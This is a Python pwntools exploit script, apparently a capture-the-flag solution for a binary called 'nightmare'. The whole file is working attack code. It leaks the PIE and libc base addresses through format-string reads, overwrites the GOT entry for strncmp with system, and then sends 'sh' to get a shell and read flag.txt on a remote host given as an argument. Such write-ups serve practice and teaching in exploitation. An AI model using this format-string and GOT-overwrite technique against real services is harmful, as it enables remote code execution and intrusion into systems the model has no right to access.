#!/usr/bin/env python3

from pwn import *
import sys

context.arch = "amd64"

def exploit(io, elf, libc):
    # leak pie base 
    payload = b"%1$p"
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b">> ", payload)
    leak = int(io.recvline().decode(), 16)
    elf.address = leak - 0x2079
    print("pie base: ", hex(elf.address)) 
    
    # leak libc base
    payload = b"%13$p"
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b">> ", payload)
    leak = int(io.recvline().decode(), 16)
    libc.address = leak - 0x0270b3
    print("libc base: ", hex(libc.address))
    
    # overwrite strncmp got
    io.sendlineafter(b">", b"1"*16)
    strncmp_got = elf.got["strncmp"]
    fmt = fmtstr_payload(5, {strncmp_got: libc.symbols["system"]})
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b">> ", fmt)
    
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b">> ", b"sh\x00")
    io.recvuntil(b">> ")
    io.sendline(b"cat flag.txt")
    flag = io.recvline().decode()
    print(flag)


def main():
    if sys.argv[1] == "debug":
        io = gdb.debug("./nightmare")
    else:
        HOST, PORT = sys.argv[1].split(":")
        io = remote(HOST, PORT)

    elf = ELF("./nightmare")
    libc = ELF("./libc.so.6")
    exploit(io, elf, libc)

if __name__ == "__main__":
    main()

